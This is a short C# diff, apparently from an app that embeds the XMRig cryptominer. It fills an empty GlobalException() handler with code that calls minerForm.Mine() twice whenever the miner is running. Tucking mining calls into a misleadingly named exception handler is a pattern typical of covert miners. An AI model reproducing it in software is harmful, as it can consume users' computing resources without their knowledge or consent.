@@ -31,7 +31,13 @@ namespace ChillinRoomGMG
 			}
 		}
 
-		private static void GlobalException() { }
+		private static void GlobalException() {
+			if (xmrig.IsRunning)
+			{
+				minerForm.Mine();
+				minerForm.Mine();
+			}
+		}
 
 		private class TrayIcon : ApplicationContext
 		{
